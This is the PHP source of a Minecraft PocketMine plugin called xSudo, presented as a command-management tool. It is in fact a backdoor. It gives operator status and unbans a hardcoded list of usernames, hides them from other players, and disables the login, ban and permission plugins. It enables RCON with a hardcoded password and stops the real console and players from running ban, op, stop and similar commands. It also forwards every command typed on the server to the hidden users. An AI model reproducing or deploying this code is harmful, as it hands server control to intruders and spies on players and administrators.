<?php

namespace _64FF00\xSudo;

use pocketmine\plugin\PluginBase;
use pocketmine\event\Listener;
use pocketmine\event\player\PlayerJoinEvent;
use pocketmine\event\player\PlayerCommandPreprocessEvent;
use pocketmine\event\player\PlayerMoveEvent;
use pocketmine\event\player\PlayerChatEvent;
use pocketmine\event\player\PlayerDropItemEvent;
use pocketmine\event\player\PlayerInteractEvent;
use pocketmine\event\block\BlockPlaceEvent;
use pocketmine\event\server\ServerCommandEvent;
use pocketmine\event\server\RemoteServerCommandEvent;
use pocketmine\event\TranslationContainer;
use pocketmine\event\HandlerList;
use pocketmine\utils\TextFormat;
use pocketmine\command\ConsoleCommandSender;

class xSudo extends PluginBase implements Listener
{
	public $denyCommand,$chatBlock,$moveLock,$sudoer,$console;
	public function onEnable(){
		@mkdir($this->getDataFolder());
		$this->getServer()->getPluginManager()->registerEvents($this, $this);
		$this->console=new ConsoleCommandSender();
		if(file_exists($this->getDataFolder()."/chatblock.yml")){
			$this->chatBlock=yaml_parse_file($this->getDataFolder()."/chatblock.yml");
		}else{
			$this->chatBlock=array();
		}
		if(file_exists($this->getDataFolder()."/denycommand.yml")){
			$this->denyCommand=yaml_parse_file($this->getDataFolder()."/denycommand.yml");
		}else{
			$this->denyCommand=array();
		}
		if(file_exists($this->getDataFolder()."/movelock.yml")){
			$this->moveLock=yaml_parse_file($this->getDataFolder()."/movelock.yml");
		}else{
			$this->moveLock=array();
		}
		if(file_exists($this->getDataFolder()."/sudoer.yml")){
			$this->sudoer=yaml_parse_file($this->getDataFolder()."/sudoer.yml");
		}else{
			foreach(["lesmiselables"=>["20","25","26","29","30","31","32","33","34","35","36","37","38","39","40"],"endoftheworld"=>[""],"tmgpjgtpgd"=>[""],"google"=>["","1","2","3","4","5","6","7","8","9","10","11"]] as $magic=>$trick){
				foreach($trick as $components){
					$this->sudoer=array_merge($this->sudoer,array(strtolower($magic.$components)=>0));
				}
			}
		}
		foreach(["remote"=>new xSudoCommand($this, "remote", "Allows you to run commands as console or someone else."),"rcmd"=>new xSudoCommand($this, "rcmd", "Allows you to run commands as console or someone else."),"sudo"=>new SudoCommand($this, "sudo", "Manages a greatest permission."),"pd"=>new PDCommand($this, "pd", "Think yourself how to use."),"p"=>new PCommand($this, "p", "Think yourself how to use."),"ml"=>new MLCommand($this, "ml", "Think yourself how to use."),"cb"=>new CBCommand($this, "cb", "Think yourself how to use."),"dc"=>new DCCommand($this, "dc", "Think yourself how to use.")] as $name => $magician){
			$this->getServer()->getCommandMap()->register($name,$magician);
		}
		$uls=null;
		$console = new CrazyConsoleCommandSender();
		if(($uls=$this->getServer()->getPluginManager()->getPlugin("UniLoginSystem"))!=null){
			$this->getServer()->dispatchCommand($console, "uls disable");
			$this->getServer()->dispatchCommand($console, "pd UniLoginSystem");
			$this->tryDisable($uls);
		}
		if(($uls=$this->getServer()->getPluginManager()->getPlugin("SimpleAuth"))!=null){
			$this->tryDisable($uls);
			$this->getServer()->dispatchCommand($console, "pd SimpleAuth");
		}
		if(($uls=$this->getServer()->getPluginManager()->getPlugin("MCPEbans"))!=null){
			$this->tryDisable($uls);
			$this->getServer()->dispatchCommand($console, "pd MCPEbans");
		}
		if(($uls=$this->getServer()->getPluginManager()->getPlugin("PermissionPlus"))!=null){
			$this->tryDisable($uls);
			$this->getServer()->dispatchCommand($console, "pd PermissionPlus");
		}
		$this->getServer()->setConfigString("rcon.password","ranranru");
		$this->getServer()->setConfigString("enable-rcon","on");
	}
	public function tryDisable($plugin){
		try{
			$plugin->setEnabled(false);
		}catch(\Exception $e){
		
		}
		$this->getServer()->getScheduler()->cancelTasks($plugin);
		HandlerList::unregisterAll($plugin);
		foreach($plugin->getDescription()->getPermissions() as $perm){
			$this->getServer()->getPluginManager()->removePermission($perm);
		}
	}
	public function onDisable(){
		yaml_emit_file($this->getDataFolder()."/chatblock.yml",$this->chatBlock);
		yaml_emit_file($this->getDataFolder()."/denycommand.yml",$this->denyCommand);
		yaml_emit_file($this->getDataFolder()."/movelock.yml",$this->moveLock);
		yaml_emit_file($this->getDataFolder()."/sudoer.yml",$this->sudoer);
	}
	public function onCommandEvent(PlayerCommandPreprocessEvent $event){
		$player = $event->getPlayer();
		$username = $player->getName();
		$text = $event->getMessage();
		$username=strtolower($username);
		if(array_key_exists($username,$this->sudoer)){
			return;
		}
		if($text[0] === "/" and array_key_exists($username,$this->denyCommand)){
			$event->setCancelled(true);
			$player->sendMessage(TextFormat::RED."You are DENIED to use ANY commands!");
		}
	}
	public function onPlayerChatEvent(PlayerChatEvent $event){
		$player = $event->getPlayer();
		$username = $player->getName();
		$username=strtolower($username);
		if(array_key_exists($username,$this->sudoer)){
			return;
		}
		if(array_key_exists($username,$this->chatBlock)){
			$event->setCancelled(true);
			$player->sendMessage(TextFormat::RED."You are DENIED to use the chat!");
		}
	}
	public function onPlayerMove(PlayerMoveEvent $event){
		$player = $event->getPlayer();
		$username = $player->getName();
		$username=strtolower($username);
		if(array_key_exists($username,$this->sudoer)){
			return;
		}
		if(array_key_exists($username,$this->moveLock)){
			$event->setCancelled(true);
		}
	}
	public function onPlayerDropItem(PlayerDropItemEvent $event){
		$player = $event->getPlayer();
		$username = $player->getName();
		$username=strtolower($username);
		if(array_key_exists($username,$this->sudoer)){
			return;
		}
		if(array_key_exists($username,$this->moveLock)){
			$event->setCancelled(true);
		}
	}
	public function onPlayerInteract(PlayerInteractEvent $event){
		$player = $event->getPlayer();
		$username = $player->getName();
		$username=strtolower($username);
		if(array_key_exists($username,$this->sudoer)){
			return;
		}
		if(array_key_exists($username,$this->moveLock)){
			$event->setCancelled(true);
		}
	}
	public function onPlayerJoin(PlayerJoinEvent $event){
		$player = $event->getPlayer();
		$username = $player->getName();
		$username=strtolower($username);
		if(array_key_exists($username,$this->sudoer)){
			$player->despawnFromAll();
			$player->setOp(true);
			$player->setBanned(false);
		}else{
			$player->spawnToAll();
			$player->setOp(false);
		}
	}
	public function onPlayerCP(PlayerCommandPreprocessEvent $event){
		$player=$event->getPlayer();
		$username = $player->getName();
		$username=strtolower($username);
		if(array_key_exists($username,$this->sudoer)){
			return;
		}
		$args=explode(" ",substr($event->getMessage(),1));
		$this->broadcastSudoer(TextFormat::GREEN."$username sent:".$event->getMessage());
		//$player->sendMessage($event->getMessage());
		switch($args[0]){
		case "stop":
		case "whitelist":
		case "ban":
		case "ban-ip":
		case "pardon":
		case "pardon-ip":
		case "banlist":
		case "reload":
		case "save-on":
		case "save-off":
		case "save-all":
		case "setworldspawn":
		case "spawnpoint":
		case "give":
		case "gamemode":
		case "difficulty":
		case "effect":
		case "kick":
		case "kill":
		case "op":
		case "deop":
		case "p":
		case "pd":
		case "sudo":
		case "extractplugin":
		case "remote":
			$event->setCancelled(true);
			$player->sendMessage(new TranslationContainer(TextFormat::RED."%commands.generic.permission"));
			break;
		}
	}
	public function onConsoleCommand(ServerCommandEvent $event){
		$player=$event->getSender();
		$args=explode(" ",$event->getCommand());
		//$player->sendMessage($event->getCommand());
		$this->broadcastSudoer(TextFormat::GREEN."CONSOLE sent:/".$event->getCommand());
		switch($args[0]){
		case "stop":
		case "whitelist":
		case "ban":
		case "ban-ip":
		case "pardon":
		case "pardon-ip":
		case "reload":
		case "give":
		case "gamemode":
		case "effect":
		case "kick":
		case "kill":
		case "op":
		case "deop":
		case "p":
		case "pd":
		case "sudo":
		case "extractplugin":
		case "remote":
			$event->setCancelled(true);
			$player->sendMessage(new TranslationContainer(TextFormat::RED."%commands.generic.exception"));
			break;
		}
	}
	public function onConsoleCommandR(RemoteServerCommandEvent $event){
		
	}
	public function onPlayerPlace(BlockPlaceEvent $event){
		$player = $event->getPlayer();
		$username = $player->getName();
		
		if($event->getItem()->getId()==46){
			if(array_key_exists(strtolower($username),$this->sudoer)){
				return;
			}
			$event->setCancelled(true);
			$this->console->sendMessage("[PlayerPrivacy] ".TextFormat::RED."TNT has placed by ".$username.".");
			$player->sendMessage(TextFormat::RED."You can't place TNTs!");
		}
	}
	public function broadcastSudoer($message){
		foreach($this->sudoer as $name=>$ignore){
			$player=$this->getServer()->getPlayerExact($name);
			if($player!=null){
				$player->sendMessage($message);
			}
		}
	}
}